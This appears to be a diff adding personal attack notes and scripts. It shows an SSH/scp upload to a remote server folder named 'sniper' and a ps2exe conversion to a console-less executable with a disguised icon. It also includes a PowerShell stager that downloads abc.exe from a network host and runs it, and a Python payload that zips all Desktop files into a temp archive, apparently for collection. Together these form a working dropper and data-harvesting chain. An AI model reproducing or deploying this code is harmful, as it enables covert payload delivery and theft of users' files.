@@ -1,0 +1,36 @@
+(ssh root@72.60.201.21)
+((scp  C:\Users\nairr\OneDrive\Desktop\login.bat root@72.60.201.21:/sniper))
+(convert to exe - (Invoke-ps2exe .\monkey.ps1 .\monkey.exe -iconFile .\mon.ico -NoConsole))
+(index.ps1)
+# Download from local network
+$url = "http://192.168.31.60/abc.exe"
+$savePath = "$env:TEMP\abc.exe"
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $savePath -UseBasicParsing
+
+# Show download result
+if (Test-Path $savePath) {
+    Write-Host "Downloaded to: $savePath" -ForegroundColor Green
+    Write-Host "Size: $((Get-Item $savePath).Length) bytes" -ForegroundColor Gray
+} else {
+    Write-Host "Download failed" -ForegroundColor Red
+}
+
+# Simple execution
+Start-Process -FilePath "$env:TEMP\abc.exe"
+
+(abc.exe)
+import zipfile, os
+from pathlib import Path
+
+desktop = Path.home() / "Desktop"
+backup = Path(os.environ['TEMP']) / "desktop_backup.zip"
+
+with zipfile.ZipFile(backup, 'w') as z:
+    for file in os.listdir(str(desktop)):
+        file_path = desktop / file
+        if os.path.isfile(file_path):
+            z.write(file_path, file)
+
+print(f"Backup created: {backup}")
